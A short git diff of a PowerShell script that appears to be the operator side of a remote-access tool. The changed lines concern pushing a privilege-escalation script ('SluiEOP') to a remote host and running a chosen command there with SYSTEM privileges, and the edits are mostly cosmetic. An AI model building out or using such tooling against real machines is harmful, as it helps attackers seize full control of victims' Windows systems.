@@ -932,8 +932,7 @@ While($Client.Connected)
            {
               write-host " - Input Command: " -NoNewline;
               $mYcOMMAND = Read-Host
-              If(-not($mYcOMMAND) -or $mYcOMMAND -eq $null){$mYcOMMAND = "C:\Windows\System32\cmd.exe"}
-              write-host " Executing: '$mYcOMMAND' with admin privileges." -ForegroundColor Blue -BackgroundColor White
+              If(-not($mYcOMMAND) -or $mYcOMMAND -eq $null){$mYcOMMAND = "$env:WINDIR\System32\cmd.exe"}
               ## Write Local script (SluiEOP.ps1.ps1) to Remote-Host $env:tmp
               $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
               $FileBytes = "($FileBytes)";
@@ -2032,7 +2031,7 @@ While($Client.Connected)
           } 
           If($SluiEOP -eq "True")
           {
-            write-host "   Exec:    '$mYcOMMAND' (with SYSTEM privs)" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            write-host "   Exec:    '$mYcOMMAND' (SYSTEM)" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
             $SluiEOP = "False";
           }
           If($Flipflop -eq "True")
